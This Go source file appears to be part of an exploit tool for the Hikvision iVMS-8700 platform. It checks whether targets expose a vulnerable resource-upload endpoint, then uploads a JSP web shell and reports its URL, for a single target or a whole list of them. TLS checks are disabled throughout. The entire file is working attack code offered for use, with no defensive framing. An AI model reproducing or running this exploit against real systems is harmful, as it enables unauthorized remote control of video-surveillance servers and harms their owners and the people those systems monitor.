package modules

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"github.com/go-resty/resty/v2"
	"net/http"
	"os"
	"strings"
	"time"
)

func (I *Ivms) checkVul() {
	headers := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"}
	body := map[string]string{"service": I.target + "/home/index.action"}
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(I.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(time.Duration(I.timeout) * time.Second)
	resp, err := client.R().SetBody(body).Post("/eps/api/resourceOperations/upload?token=" + I.md5hash())
	if err != nil {
		return
	}
	if resp.StatusCode() == http.StatusOK {
		I.vuln = true
	}
}
func (I *Ivms) uploadShell() {
	headers := map[string]string{"User-Agent": "MicroMessenger", "Upgrade-Insecure-Requests": "1", "Cache-Control": "no-cache"}
	client := resty.New()
	client.SetHeaders(headers)
	client.SetBaseURL(I.target)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(time.Duration(I.timeout) * time.Second)
	file, _ := os.ReadFile(I.shellFile)
	resp, err := client.R().SetFileReader("fileUploader", I.shellFile, bytes.NewReader(file)).Post("/eps/resourceOperations/upload.action")
	if err != nil {
		return
	}
	if strings.Contains(string(resp.Body()), "success") {
		if uuid := I.getUuid(resp.Body()); uuid != "" {
			I.shellPath = I.target + fmt.Sprintf("/eps/upload/%s.jsp\n", uuid)
		}
	} else {
		fmt.Printf("[-] target %s is secure\n", I.target)
	}
}
func (I *Ivms) Single() {
	I.parseTarget()
	I.checkVul()
	if I.vuln {
		fmt.Printf("[+] target %s may have vuln\n", I.target)
	} else {
		fmt.Printf("[-] target %s is secure\n", I.target)
		return
	}
	if I.upload {
		I.uploadShell()
		fmt.Printf("[+] shell path %s\n", I.shellPath)
	}
}
func (I *Ivms) Multi() {
	for _, v := range I.targets {
		wg.Add(1)
		func() {
			defer wg.Done()
			i := Ivms{target: v, shellFile: I.shellFile}
			i.parseTarget()
			i.checkVul()
			if i.vuln {
				fmt.Printf("[+] target %s may have vuln\n", i.target)
				if I.upload {
					i.uploadShell()
					fmt.Printf("[+] shell path %s\n", i.shellPath)
				}
			} else {
				fmt.Printf("[-] target %s is secure or have some problem\n", I.target)
			}
		}()
	}
	wg.Wait()
}
func (I *Ivms) Run() {
	I.init()
	if len(I.targets) != 0 {
		I.Multi()
	} else {
		I.Single()
	}
}
